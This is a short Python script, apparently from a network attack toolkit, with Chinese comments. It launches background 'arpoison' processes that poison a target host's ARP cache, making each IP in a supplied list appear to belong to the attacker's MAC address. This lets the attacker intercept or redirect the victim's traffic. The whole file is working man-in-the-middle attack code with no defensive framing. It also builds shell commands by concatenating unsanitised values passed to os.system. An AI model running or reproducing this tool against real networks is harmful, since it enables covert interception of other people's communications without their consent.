# -*- coding: utf-8 -*-

import os
import sys

sys.path.append(sys.path[0] + "/modules/")    #python 2.7 对   modules.  的方式兼容不好
from getinfo import *   ## 用于获得基础信息


### 用于普通IP转发

def cheatsarpoisonIP(device,ip,remoteips,ipmacs,localmacs):

	cmd="nohup arpoison -i "  + device +" -d "  + ip + " -s " + remoteips +"  -t " + ipmacs +" -r " +localmacs + " -w 2   >/dev/null 2>log &"
	#print(cmd)
	os.system(cmd) 


def tocheatarpIP(device,ip,localmacs,ipfile):

	####  处理配置文件
	paths=os.getcwd() 
	configfile=ipfile + ".temp"
	cmd="touch " + configfile
	os.system(cmd)

	f = open(paths  + "/" + ipfile)            
	file_object = open(paths  + "/" + configfile, 'w')

	for line in f:  
		if line[0:1]!="#":       #非注释
			file_object.write(line)

	f.close()
	file_object.close()	

	### 逐行进行执行

	file_object = open(paths  + "/" + configfile)
	for remoteips in file_object:
		remoteips=remoteips.replace("\n","")

		ipmacs=getremotemac(ip)         ## 注意这里是目标的MAC,  不是列表中待转发的MAC
		cheatsarpoisonIP(device,ip,remoteips,ipmacs,localmacs)

	file_object.close()






